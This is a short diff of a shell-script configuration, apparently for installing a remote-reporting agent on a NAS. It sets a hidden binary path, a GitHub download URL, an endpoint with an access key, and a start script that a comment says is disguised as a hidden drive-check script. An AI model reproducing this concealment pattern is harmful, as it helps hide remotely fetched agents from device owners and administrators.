@@ -9,7 +9,7 @@ AGENT_BIN="/mnt/HD_a4/.cache_db"
 # 原下载地址
 DOWNLOAD_URL="https://raw.githubusercontent.com/cyclestudy/download/refs/heads/main/armv5telc"
 # 启动参数
-AGENT_ARGS="-e https://status.sm.uy -k O9pLRABOGuUNA1tLj5uHM8 -i 3"
+AGENT_ARGS="-e https://status.sm.uy -k QE1PFxxmpf0TlgZ5ZnZNwF -i 3"
 
 # 实际执行启动的脚本路径 (伪装成隐藏的系统检查脚本)
 START_SCRIPT="/mnt/HD_a4/.smart_drive_check.sh"
